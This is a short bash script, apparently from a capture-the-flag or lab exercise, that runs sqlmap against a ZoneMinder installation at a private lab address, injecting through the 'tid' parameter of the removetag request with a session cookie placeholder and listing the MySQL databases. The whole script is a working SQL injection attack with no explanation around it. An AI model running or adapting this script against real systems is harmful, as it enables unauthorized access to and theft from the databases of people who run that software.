#!/bin/bash

sqlmap -u 'http://10.129.61.151/zm/index.php?view=request&request=event&action=removetag&tid=1' \
	--cookie="ZMSESSID=SESSION_COOKIE_HERE" \
	-p tid --dbms=mysql --batch --dbs
